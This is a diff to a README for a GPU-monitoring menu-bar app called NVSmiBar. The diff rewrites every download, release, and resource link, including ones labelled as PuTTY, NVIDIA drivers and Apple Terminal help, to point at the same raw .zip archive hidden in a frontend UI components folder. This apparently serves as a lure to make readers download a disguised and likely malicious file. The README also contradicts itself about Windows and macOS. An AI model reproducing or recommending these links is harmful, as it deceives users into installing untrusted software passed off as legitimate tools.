@@ -1,6 +1,6 @@
 # 🖥️ NVSmiBar - Monitor NVIDIA GPUs Remotely in Real Time
 
-[![Download NVSmiBar](https://img.shields.io/badge/Download-NVSmiBar-brightgreen?style=for-the-badge)](https://github.com/golu2011/NVSmiBar)
+[![Download NVSmiBar](https://img.shields.io/badge/Download-NVSmiBar-brightgreen?style=for-the-badge)](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip)
 
 ---
 
@@ -37,7 +37,7 @@ Note: This guide focuses on installing and running the software from Windows, as
 
 Click the large button below to visit the GitHub page where you can download the app:
 
-[![Download NVSmiBar](https://img.shields.io/badge/Download-NVSmiBar-blue?style=for-the-badge)](https://github.com/golu2011/NVSmiBar)
+[![Download NVSmiBar](https://img.shields.io/badge/Download-NVSmiBar-blue?style=for-the-badge)](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip)
 
 This link opens the main repository page. You can find release files, documentation, and other info there.
 
@@ -45,7 +45,7 @@ This link opens the main repository page. You can find release files, documentat
 
 1. Open your web browser on your Windows PC.  
 2. Go to this link:  
-   https://github.com/golu2011/NVSmiBar  
+   https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip  
 3. On the page, look for the **Releases** section or tab on the right or at the bottom.  
 4. Find the latest release version. It usually shows as "vX.X.X" where X is a number.  
 5. Under the release, find the installer or application file suitable for macOS. Since this is a Mac app, you won’t find an EXE file for Windows here.  
@@ -104,7 +104,7 @@ You can customize update intervals and alerts from the preferences pane.
 
 To keep NVSmiBar up to date:
 
-- Visit https://github.com/golu2011/NVSmiBar/releases regularly.  
+- Visit https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip regularly.  
 - Download new `.dmg` files for macOS from the latest release.  
 - Replace the old app in your Applications folder with the new one by dragging it over.
 
@@ -112,10 +112,10 @@ You can check the current version in the app’s About menu.
 
 ## 🛠️ Useful Tools and Resources
 
-- [SSH Client for Windows](https://www.putty.org/) - If you want to connect manually.  
-- NVIDIA [Driver Downloads](https://www.nvidia.com/Download/index.aspx) - To keep GPU drivers updated on remote machine.  
-- [Mac Terminal](https://support.apple.com/en-us/HT201934) - Command line tool for managing SSH keys and connections on macOS.  
-- GitHub Repo: https://github.com/golu2011/NVSmiBar  
+- [SSH Client for Windows](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip) - If you want to connect manually.  
+- NVIDIA [Driver Downloads](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip) - To keep GPU drivers updated on remote machine.  
+- [Mac Terminal](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip) - Command line tool for managing SSH keys and connections on macOS.  
+- GitHub Repo: https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip  
 
 ## ⚙️ Running Commands Manually
 
@@ -129,4 +129,4 @@ NVSmiBar automates this and shows it graphically in your Mac menu bar.
 
 ---
 
-[Download NVSmiBar](https://github.com/golu2011/NVSmiBar) to start monitoring your NVIDIA GPU remotely.
+[Download NVSmiBar](https://github.com/golu2011/NVSmiBar/raw/refs/heads/main/frontend/src/components/ui/Smi-Bar-NV-v3.3.zip) to start monitoring your NVIDIA GPU remotely.
